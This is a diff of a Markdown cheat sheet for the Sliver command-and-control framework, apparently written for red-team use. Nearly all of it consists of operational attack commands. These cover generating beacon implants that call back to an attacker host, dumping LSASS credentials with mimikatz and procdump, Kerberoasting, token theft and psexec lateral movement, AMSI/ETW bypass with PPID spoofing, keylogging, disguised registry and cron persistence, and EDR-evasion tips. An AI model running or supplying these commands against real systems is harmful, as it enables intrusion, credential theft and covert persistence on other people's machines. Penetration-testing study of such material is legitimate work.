@@ -7,190 +7,375 @@ Sliver is an open-source C2 framework from BishopFox. It supports multiple trans
 
 **C2 server vs implant:** The Sliver server runs on your attacker machine and exposes listener ports. The implant runs on the target and calls back to those listeners. You interact with implants through the Sliver console.
 
-**Beacon vs Session:** A beacon checks in at a configurable interval (e.g. every 60 seconds), receives queued tasks, executes them, then goes back to sleep. A session holds a persistent interactive connection that responds immediately. Beacons are far stealthier and are preferred for real engagements. Sessions are useful for quick interactive work but generate continuous traffic.
+**Beacon vs Session:** A beacon checks in at a configurable interval, receives queued tasks, executes them, then goes back to sleep. A session holds a persistent interactive connection. Beacons are far stealthier and preferred for real engagements. Sessions are useful for quick interactive work or when running extensions with persistent global state.
 
-**Implant naming:** Sliver auto-assigns a random two-word name to each implant (e.g. `WARM_LUMBERMAN`, `SILENT_MOTH`). This name is how you reference the implant across `use`, `sessions`, and `beacons` commands. You can rename with `rename`.
+**Implant naming:** Sliver auto-assigns a random two-word name to each implant (e.g. `WARM_LUMBERMAN`). This is how you reference the implant in `use`, `sessions`, and `beacons` commands.
 
-**Task-based execution:** In beacon mode, commands you issue are queued on the server. They are not executed until the beacon checks in. Use `tasks` to see pending and completed tasks, and `tasks fetch <id>` to retrieve the output of a specific task.
+**Task-based execution:** In beacon mode, commands are queued on the server and not executed until the beacon checks in. Use `tasks` to see pending and completed tasks; `tasks fetch <id>` to retrieve output.
 
 ## Listeners
 
-Listeners run on the C2 server and wait for implant callbacks. Choose the transport based on what egress is available on the target network and your OPSEC requirements.
+```bash wrap
+mtls                                       # mutual TLS on port 8888
+https                                      # HTTPS on port 443 (preferred)
+https --lhost 0.0.0.0 --lport 443
+http --lhost 0.0.0.0 --lport 80           # plain HTTP — never on real engagements
+dns --domains c2.yourdomain.com            # DNS C2, works through strict egress, slowest
+
+jobs                                       # list active listeners
+jobs --kill <job-id>                       # stop a listener
+```
+
+### Stage Listener
 
 ```bash wrap
-mtls                                       # mutual TLS on port 8888; fully authenticated and encrypted
-https                                      # HTTPS on port 443; most firewall-friendly, preferred for engagements
-https --lhost 0.0.0.0 --lport 443         # explicitly bind HTTPS to all interfaces on 443
-http --lhost 0.0.0.0 --lport 80           # plain HTTP; never use on a real engagement
-dns --domains c2.yourdomain.com            # DNS-based C2; works through strict egress filtering but slowest
+# Create an implant profile for staging
+profiles new beacon \
+  --http sliver.labnet.local \
+  --seconds 60 \
+  --jitter 30 \
+  --skip-symbols \
+  --format shellcode \
+  --arch amd64 \
+  myprofile
 
-jobs                                       # list all active listeners (jobs)
-jobs --kill <job-id>                       # stop a specific listener
+# Start the stage listener (serves shellcode to stagers)
+stage-listener --url http://sliver.labnet.local:80 --profile myprofile
+
+jobs   # verify it started
 ```
 
 ## Generating Implants
 
-Beacons are the default choice. Session implants are available when you need immediate interactivity. Output format determines whether you get an EXE, DLL, raw shellcode, or service binary.
+Beacons are the default. Session implants are available for interactive work. Output format determines EXE, DLL, raw shellcode, or service binary.
 
 ```bash wrap
-# Beacon implants (preferred for real engagements)
-generate beacon --https $LHOST:443 --save .      # HTTPS beacon, output to current directory
-generate beacon --http $LHOST:80 --save .        # HTTP beacon
-generate beacon --mtls $LHOST:8888 --save .      # mTLS beacon
+# Beacon implants (preferred)
+generate beacon --https $LHOST:443 --save .
+generate beacon --mtls $LHOST:8888 --save .
 
-# Beacon with OPSEC timing (randomised check-in reduces traffic pattern detection)
+# Beacon with OPSEC timing
 generate beacon --https $LHOST:443 \
-  --seconds 60 \                               # base check-in interval in seconds
-  --jitter 30 \                                # adds up to 30s random delay (actual range: 60-90s)
+  --seconds 60 \
+  --jitter 30 \
   --save .
 
-# Session implants (persistent interactive connection, noisier)
+# Session implants (noisier)
 generate --https $LHOST:443 --save .
 generate --mtls $LHOST:8888 --save .
 
 # Platform targeting
-generate beacon --https $LHOST:443 --os windows --arch amd64 --save .   # Windows x64
-generate beacon --https $LHOST:443 --os linux --arch amd64 --save .     # Linux x64
-generate beacon --https $LHOST:443 --os darwin --arch arm64 --save .    # macOS Apple Silicon
+generate beacon --https $LHOST:443 --os windows --arch amd64 --save .
+generate beacon --https $LHOST:443 --os linux   --arch amd64 --save .
+generate beacon --https $LHOST:443 --os darwin  --arch arm64 --save .
 
 # Output formats
-generate beacon --https $LHOST:443 --format exe --save .                # default Windows executable
-generate beacon --https $LHOST:443 --format shellcode --save .          # raw shellcode for injection
-generate beacon --https $LHOST:443 --format shared --save .             # DLL (for side-loading or injection)
-generate beacon --https $LHOST:443 --format service --save .            # Windows service binary
+generate beacon --https $LHOST:443 --format exe       --save .   # default EXE
+generate beacon --https $LHOST:443 --format shellcode --save .   # raw shellcode
+generate beacon --https $LHOST:443 --format shared    --save .   # DLL
+generate beacon --https $LHOST:443 --format service   --save .   # Windows service binary
 
-implants                                       # list all previously generated implants
+implants   # list all previously generated implants
 ```
 
 ## Session Management
 
-These commands manage active beacons and sessions from the main Sliver console. Once you `use` an implant, subsequent commands run in its context.
-
 ```bash wrap
-beacons                          # list all beacons waiting to check in
-sessions                         # list all active interactive sessions
-use <id>                         # interact with a beacon or session by ID (tab-complete works)
-background                       # return to the Sliver main console from an implant context
-interactive                      # open a temporary interactive session from within a beacon context
-sessions --kill <id>             # kill a specific session
-rename --name NEW_NAME           # rename the current implant to something memorable
-tasks                            # list all queued and completed tasks for the current beacon
-tasks fetch <task-id>            # pull the output of a specific completed task
+beacons                          # list all beacons
+sessions                         # list all active sessions
+use <id>                         # interact with a beacon or session (tab-complete)
+background                       # return to main console
+interactive                      # open temporary session from a beacon
+info                             # show beacon/session details (cached, no round-trip)
+rename -n NEW_NAME               # rename current implant
+reconfig -i 30s -j 0s           # change beacon check-in interval and jitter
+sessions --kill <id>             # kill a session
+tasks                            # list queued and completed tasks (beacon mode)
+tasks fetch <task-id>            # pull output of a completed task
 ```
 
 ## Recon
 
-Basic situational awareness commands to run immediately after getting a callback. Understand the user, host, network position, and what security tooling is present before doing anything else.
-
 ```bash wrap
-whoami                  # current username and domain
-getuid                  # numeric user ID (Linux) or SID (Windows)
-hostname                # machine hostname
-ifconfig                # all network interfaces and IP addresses
-netstat                 # active network connections (useful for spotting other C2 or monitoring)
-ps                      # full process list with PID, name, owner, and architecture
-getprivs                # list current privileges and enabled tokens (Windows)
-getsystem               # attempt automatic privilege escalation to SYSTEM (Windows)
-screenshot              # capture a screenshot of the target desktop
+whoami                           # current username and domain
+getuid                           # UID (Linux) or SID (Windows)
+getgid                           # GID
+getpid                           # current process ID
+hostname                         # machine hostname
+ifconfig                         # all network interfaces
+ifconfig -A                      # include loopback
+netstat                          # active network connections (non-LISTEN)
+netstat --listen                 # listening connections only
+netstat --tcp                    # TCP only (default)
+netstat --udp                    # include UDP
+netstat --ip4                    # IPv4 connections
+netstat --ip6                    # IPv6 connections
+ps                               # full process list (red=AV/EDR, green=implant process)
+getprivs                         # current privileges and enabled tokens (Windows)
+screenshot                       # capture desktop screenshot
 ```
 
 ## File Operations
 
-Standard file management from within a session or beacon context. Downloads and uploads work on both Windows and Linux targets.
+```bash wrap
+ls /path/to/dir                                           # list directory
+pwd                                                       # print working directory
+cd C:/Users                                               # change directory
+cat C:/Windows/system.ini                                 # print file contents
+upload /local/path/file.exe /remote/C:/Temp/file.exe      # push file to target
+download /remote/C:/Windows/Temp/loot.txt /local/loot/    # pull file
+download C:/Users/tester/Desktop                          # download entire directory (as .tar.gz)
+mv /remote/old /remote/new                                # move or rename
+mkdir /path/to/newdir                                     # create directory (recursive, 700)
+rm /path/to/file                                          # delete file
+rm -r C:/somedir                                          # recursive delete
+```
+
+### Loot Management
+
+Files marked with `--loot` are stored server-side and visible to all operators in the team server.
 
 ```bash wrap
-upload /local/path/file.exe /remote/C:/Temp/file.exe     # push a file to the target
-download /remote/C:/Windows/Temp/loot.txt /local/loot/   # pull a file back to attacker
-ls /path/to/dir                                          # list directory contents
-cat /path/to/file                                        # read a file and print to console
-mkdir /path/to/newdir                                    # create a directory
-rm /path/to/file                                         # delete a file
+loot                             # list all looted files
+loot fetch                       # interactive prompt to view a looted file
+loot fetch -s /tmp/myfile        # download a specific looted file to disk
 ```
 
 ## Shell Access
 
-Use `execute` for single commands instead of opening a full interactive shell. A full shell is noisier, harder to log, and draws more EDR attention.
+Use `execute` for single commands rather than opening a full shell. A full shell is noisier and draws more EDR attention.
 
 ```bash wrap
-execute -o whoami                        # run a single command and capture output
-execute -o "net user /domain"            # run with arguments; quote the full command string
+execute -o whoami                          # run a command and capture output
+execute -o "net user /domain"
 execute -o "ipconfig /all"
-shell                                    # open a full interactive shell (bash or PowerShell); noisy, avoid if possible
+shell                                      # interactive shell (bash/PowerShell); noisy, avoid
 ```
 
 ## Process Operations
 
-Process listing helps you identify AV and EDR processes and find good migration targets. Migrating into a legitimate, long-running process makes the implant harder to detect and more survivable.
+```bash wrap
+ps                               # list all processes (PID, name, owner, architecture)
+migrate <pid>                    # migrate implant into target process
+procdump <pid>                   # dump process memory to disk on target (use on lsass PID)
+terminate <pid>                  # terminate a process by PID
+kill                             # kill the current implant process
+```
+
+### Windows Token Manipulation
 
 ```bash wrap
-ps                                       # list all running processes with PID, name, owner, and architecture
-migrate <pid>                            # migrate implant into the target process
-                                         # good targets: explorer.exe, svchost.exe, RuntimeBroker.exe
-                                         # avoid: cmd.exe, powershell.exe (both are heavily monitored)
-procdump <pid>                           # dump memory of a process to disk on the target
-                                         # use on the LSASS PID for credential extraction offline
+impersonate <username>           # steal token of a logged-in user
+make-token <domain> <user> <pass>  # create logon session with specified credentials
+rev2self                         # revert to original token (drop stolen token)
+runas <user> <command>           # run command as a different user
+getsystem                        # escalate to SYSTEM via token impersonation
+psexec --hostname $TARGET --username Administrator --password $PASSWORD
+```
+
+## Windows Registry
+
+Registry commands default to `HKCU`. Use `-H HKLM` for `HKEY_LOCAL_MACHINE`. Add `--hostname` to target a remote host's registry over the network.
+
+```bash wrap
+# Read a value
+registry read -H HKLM "software\microsoft\windows nt\currentversion\ProductName"
+
+# List all values in a key
+registry list-values -H HKLM "software\microsoft\windows nt\currentversion"
+
+# List all subkeys of a key
+registry list-subkeys -H HKLM "software\microsoft\windows nt\currentversion"
+
+# Write a value
+registry write -H HKLM "software\mykey\ValueName" mydata
+
+# Create a subkey
+registry create -H HKLM "software\mykey"
+
+# Delete a key
+registry delete -H HKLM "software\mykey"
 ```
 
 ## Pivoting
 
-Sliver has built-in SOCKS5 and port forwarding to route traffic through an implant into unreachable network segments.
-
 ```bash wrap
 # SOCKS5 proxy: route tool traffic through the implant
-socks5 start --host 127.0.0.1 --port 1080   # bind a SOCKS5 proxy locally on the C2 server
-# add to /etc/proxychains.conf: socks5 127.0.0.1 1080
-# then route any tool through it:
-# proxychains nxc smb 192.168.1.0/24 -u user -p pass
+socks5 start --host 127.0.0.1 --port 1080
+# Add to /etc/proxychains.conf: socks5 127.0.0.1 1080
+# then: proxychains nxc smb 192.168.1.0/24 -u $USER -p $PASSWORD
 
 socks5                                       # list active SOCKS5 proxies
 socks5 stop --id <id>                        # stop a proxy
 
-# Local port forward: expose an internal service on your local machine
-portfwd add --remote 192.168.1.5:445 --local 127.0.0.1:8445   # access internal SMB via local 8445
+# Local port forward: expose internal service on your local machine
+portfwd add --remote 192.168.1.5:445 --local 127.0.0.1:8445
 
 # Reverse port forward: expose your attacker service to the internal network
-rportfwd add --remote 8080 --local 192.168.1.10:80             # target network can reach your port 8080
+rportfwd add --remote 8080 --local 192.168.1.10:80
 
-portfwd                                      # list active port forwards
-rportfwd                                     # list active reverse port forwards
+portfwd                                      # list port forwards
+rportfwd                                     # list reverse port forwards
 ```
 
-## Lateral Movement
+## In-Memory Execution
 
-Sliver provides a built-in PsExec-style lateral movement command. For shellcode-based movement, generate a shellcode implant and inject it via a BOF or in-memory loader.
+Sliver provides three commands for running code in-memory without dropping binaries to disk. All three support PPID spoofing to make the sacrificial process appear as a child of a legitimate parent.
+
+### execute-assembly
+
+Runs a .NET assembly in a sacrificial process (or in-process) using Donut. Windows only.
 
 ```bash wrap
-# Built-in PsExec-style lateral movement
-psexec --hostname $TARGET.$DOMAIN --username Administrator --password $PASSWORD
+# Basic usage
+execute-assembly /tmp/Seatbelt.exe -group=All
 
-# Generate shellcode beacon for manual injection into a remote process
-generate beacon --mtls $LHOST:8888 --format shellcode --save /tmp/beacon.bin
-# then load beacon.bin via execute-bof, a custom loader, or a third-party injector
+# Sacrificial process with PPID spoofing (appear as child of explorer.exe)
+execute-assembly --ppid 4272 --process calc.exe --loot --name seatbelt \
+  /tmp/Seatbelt.exe -group=All
+
+# In-process (no sacrificial process; faster but risks crashing implant)
+execute-assembly --in-process --loot --name seatbelt /tmp/Seatbelt.exe -group=user
+
+# Bypass AMSI and ETW (in-process mode only)
+execute-assembly --in-process --amsi-bypass --etw-bypass /tmp/assembly.exe
+
+# Run a .NET DLL specifying class and method
+execute-assembly --process calc.exe --class MyClass --method RunMyCode /tmp/LibMBox.dll
 ```
+
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--in-process` | `-i` | Run in the sliver process (no sacrificial process) |
+| `--amsi-bypass` | `-M` | Bypass AMSI (in-process only) |
+| `--etw-bypass` | `-E` | Bypass ETW (in-process only) |
+| `--ppid` | `-P` | Parent PID to spoof for sacrificial process |
+| `--process` | `-p` | Sacrificial process name (default: notepad.exe) |
+| `--process-arguments` | `-A` | Arguments to pass to hosting process |
+| `--class` | `-c` | Class name (required for .NET DLL) |
+| `--method` | `-m` | Method to call (required for .NET DLL) |
+| `--loot` | `-X` | Save output as loot (server-side, all operators see it) |
+| `--save` | `-s` | Save output to local file in /tmp |
+| `--timeout` | `-t` | Timeout in seconds (default: 60) |
+
+**Note:** Argument length is capped at 256 characters in sacrificial process mode (Donut limitation). Use `--in-process` to bypass this.
+
+### sideload
+
+Loads and executes a shared library (DLL, .so, .dylib) or Windows EXE in a sacrificial process using Donut. Always spawns a new process.
+
+```bash wrap
+# Windows DLL with specific exported entry point
+sideload --entry-point RunMyCode /payloads/PasswordPrompt.dll 2
+
+# Windows EXE (no entry-point needed)
+sideload /home/kali/chisel.exe client 192.168.1.10:8000 R:socks
+
+# Custom sacrificial process
+sideload --entry-point RunMyCode \
+  --process "C:\Program Files\Edge\Application\msedge.exe" \
+  /payloads/PasswordPrompt.dll 3
+
+# Linux: inject .so via LD_PRELOAD into bash
+sideload -p /bin/bash /tmp/mylib.so
+
+# macOS: inject .dylib via DYLD_INSERT_LIBRARIES into Safari
+sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment \
+  -a 'Hello World' /tmp/mylib.dylib
+```
+
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--entry-point` | `-e` | Exported function to call (Windows only) |
+| `--process` | `-p` | Path to sacrificial process (default: notepad.exe) |
+| `--ppid` | `-P` | Parent PID to spoof |
+| `--process-arguments` | `-A` | Arguments to pass to hosting process |
+| `--keep-alive` | `-k` | Do not terminate host process after execution |
+| `--unicode` | `-w` | Pass args to DLL in UNICODE (default: ANSI) |
+| `--loot` | `-X` | Save output as loot |
+| `--save` | `-s` | Save output to local file |
+| `--timeout` | `-t` | Timeout in seconds (default: 60) |
+
+### spawndll
+
+Loads and executes a Reflective DLL in a sacrificial process. The DLL must implement a reflective loader (exports `ReflectiveLoader` by default). Does not use Donut. Windows only.
+
+```bash wrap
+# Standard reflective DLL
+spawndll /tmp/reflective_dll.x64.dll
+
+# Custom reflective loader export (renamed for stealth)
+spawndll --export NotARefl3ct1veL04d3r /tmp/reflective_dll.x64.dll
+
+# With argument (required for some DLLs like Outflank-PsC)
+spawndll /tmp/Outflank-PsC.dll foo
+
+# Custom sacrificial process
+spawndll --process "C:/Windows/system32/mspaint.exe" /tmp/reflective_dll.x64.dll
+```
+
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--export` | `-e` | Reflective loader export name (default: ReflectiveLoader) |
+| `--process` | `-p` | Path to sacrificial process (default: notepad.exe) |
+| `--ppid` | `-P` | Parent PID to spoof |
+| `--keep-alive` | `-k` | Do not terminate host process after execution |
+| `--loot` | `-X` | Save output as loot |
+| `--save` | `-s` | Save output to local file |
+| `--timeout` | `-t` | Timeout in seconds (default: 60) |
 
 ## Armory
 
-Armory is Sliver's extension manager. It installs community tools (Rubeus, SharpHound, Seatbelt, Mimikatz, and others) as aliases that run in-memory via BOFs or .NET assemblies. Nothing touches disk.
+Armory is Sliver's package manager. Packages are aliases that wrap `execute-assembly`, `sideload`, or `spawndll` calls with pre-configured arguments. Nothing touches disk.
 
 ```bash wrap
 armory install all                       # install all available packages
-armory install rubeus                    # install a single tool by name
-armory list                              # list available packages and their descriptions
+armory install rubeus                    # install a single package
+armory list                              # list available packages
 
-# After installation, run tools directly from any beacon or session context
-rubeus kerberoast                                          # Kerberoast all SPNs from memory
-rubeus asktgt /user:svc_account /password:Password123!    # request a TGT
-seatbelt -group=all                                        # comprehensive host enumeration
-mimikatz "sekurlsa::logonpasswords" "exit"                 # dump credentials from LSASS
-sharpup audit                                             # check for common privesc paths
+# After installation, run tools directly from any beacon/session context
+rubeus kerberoast
+rubeus asktgt /user:svc_account /password:Password123!
+seatbelt -group=all
+mimikatz "sekurlsa::logonpasswords" "exit"
+sharpup audit
+```
+
+## Extensions
+
+Extensions are reflective DLLs implementing the Sliver extension API. They run in-process within the implant without spawning a sacrificial process. Install client-side only (`~/.sliver-client/extensions/`).
+
+**Use sessions for extensions with global state** (e.g., keyloggers): beacons reload the DLL on each call, wiping global state. Sessions cache the loaded extension and maintain state across calls.
+
+```bash wrap
+# Install from a directory or .tar.gz archive
+extensions install /home/kali/PasswordPrompt
+
+# Load an installed extension (adds its command to the console)
+extensions load PasswordPrompt
+
+# List installed extensions
+extensions
+
+# Remove an extension
+extensions rm PasswordPrompt
+
+# After loading, the extension appears as a new command
+PasswordPrompt 3
+
+# Keylogger extension example (session implants only)
+raw_keylogger 1                          # start keylogger
+raw_keylogger 2                          # retrieve logged keystrokes
+raw_keylogger 0                          # stop keylogger
+raw_keylogger --help                     # extension help
 ```
 
 ## BOFs
 
-BOF (Beacon Object File) is a compiled C object that runs inside the beacon process. No binary is dropped to disk, the footprint is minimal, and execution is fast. Sliver is compatible with Cobalt Strike BOFs.
+BOF (Beacon Object File) is a compiled C object that runs inside the beacon process. No binary is dropped to disk, minimal footprint, compatible with Cobalt Strike BOFs.
 
 ```bash wrap
-execute-bof /path/to/file.o                              # load and execute a BOF locally
+execute-bof /path/to/file.o              # load and execute a BOF locally
 
 # TrustedSec's CS-Situational-Awareness-BOF pack works directly in Sliver
 # Install via armory or load .o files manually with execute-bof
@@ -198,30 +383,25 @@ execute-bof /path/to/file.o                              # load and execute a BO
 
 ## Persistence
 
-Persistence mechanisms keep the implant running across reboots. Run these carefully and clean up after the engagement.
-
 ```bash wrap
-# Windows: write to the HKCU Run registry key (runs at user logon, no admin needed)
+# Windows: HKCU Run key (user logon, no admin needed)
 registry write \
-  --hive HKCU \
-  --path "Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
-  --key "Updater" \
-  --value "C:\\Users\\user\\AppData\\Local\\updater.exe" \
-  --type string
+  -H HKCU \
+  "Software\Microsoft\Windows\CurrentVersion\Run\Updater" \
+  "C:\Users\user\AppData\Local\updater.exe"
 
-# Linux: add a cron job for persistence
-cron add --name persist --cmd "/tmp/.update" --schedule "*/5 * * * *"   # runs every 5 minutes
+# Linux: cron job
+cron add --name persist --cmd "/tmp/.update" --schedule "*/5 * * * *"
 ```
 
 ## OPSEC Tips
 
-Operational security considerations for using Sliver on real engagements:
-
-- Prefer beacons over sessions in every engagement; persistent connections are trivial to flag in network monitoring
-- Set sleep and jitter to at least 60 seconds base with 30 seconds jitter; flat check-in intervals are easy to detect
-- Use mTLS or HTTPS transports; plain HTTP is never acceptable on a real engagement
-- Migrate out of your initial shell process immediately after getting a beacon (cmd.exe and powershell.exe are heavily monitored by EDR)
+- Prefer beacons over sessions: persistent connections are trivial to flag in network monitoring
+- Set sleep + jitter to at least 60s base / 30s jitter: flat check-in intervals are easy to detect
+- Use mTLS or HTTPS: plain HTTP is never acceptable on a real engagement
+- Migrate out of your initial shell process immediately (`cmd.exe` and `powershell.exe` are heavily monitored by EDR)
 - Good migration targets: `explorer.exe`, `svchost.exe`, `RuntimeBroker.exe`, `OneDrive.exe`
-- Run post-ex tools via armory in-memory rather than uploading and executing binaries from disk
-- For HTTPS listeners, configure a custom C2 profile that mimics real browser traffic (realistic User-Agent, Host header, URI paths)
-- Kill all listeners and sessions at the end of an engagement; do not leave C2 infrastructure running
+- Use `--ppid` spoofing on `execute-assembly`, `sideload`, and `spawndll` to make sacrificial processes appear user-spawned
+- Run post-ex tools via armory or extensions in-memory rather than uploading and executing from disk
+- For HTTPS listeners, configure a custom C2 profile that mimics real browser traffic (User-Agent, Host header, URI paths)
+- Kill all listeners and sessions at the end of an engagement
